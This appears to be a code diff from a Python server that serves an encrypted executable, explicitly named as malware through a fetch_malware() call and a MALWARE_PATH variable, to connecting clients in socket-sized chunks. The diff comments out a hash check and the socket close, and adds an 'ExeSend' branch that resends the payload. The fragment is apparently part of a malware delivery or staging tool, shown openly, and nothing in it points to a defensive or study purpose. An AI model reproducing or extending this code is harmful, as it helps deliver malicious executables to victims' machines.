@@ -127,10 +127,16 @@ def start_server():
                 encryptor = cipher.encryptor()
 
                 original_text = pad_data(fetch_malware())
+                
+                #hash_original_text = hashlib.sha256(original_text).hexdigest()
+                #response = {"Operation": "ExeSend", "Hash": hash_original_text}
+                #print("Sending hash for check")
+                #client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
+                
                 cipher_text = encryptor.update(original_text) + encryptor.finalize()
 
                 split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)
-
+                
                 progress = tqdm.tqdm(range(FILE_SIZE), f"Sending {MALWARE_PATH}", unit="B", unit_scale=True, unit_divisor=FILE_SIZE / 100)
 
                 print("Sending encrypted executable")
@@ -138,13 +144,18 @@ def start_server():
                     client_socket.sendall(data)
                     progress.update(len(data))
 
-                client_socket.close()
+                #client_socket.close()
                 break
+            
+            elif operation == "ExeSend":
+                for data in split_data:
+                    client_socket.sendall(data)
+                    progress.update(len(data))
+                                    
 
         print("End request")
 
 
 if __name__ == "__main__":
-    print(IV.hex())
-    print(SALT.hex())
+    print(str(FILE_SIZE))
     start_server()
